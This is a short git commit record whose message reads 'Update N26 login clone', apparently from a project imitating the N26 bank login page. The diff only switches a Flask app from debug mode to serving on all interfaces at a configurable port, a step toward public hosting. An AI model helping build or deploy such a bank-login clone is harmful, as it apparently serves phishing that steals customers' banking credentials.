2c8c4ddf7b17debf86d656556713c7a78e94a19e
office navada <nnavavada@gmail.com>
2026-05-01 01:54:02 +1000

    Update N26 login clone

--- app.py
+++ app.py
@@ -84,4 +84,4 @@ def complete():
     return render_template('complete.html')
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
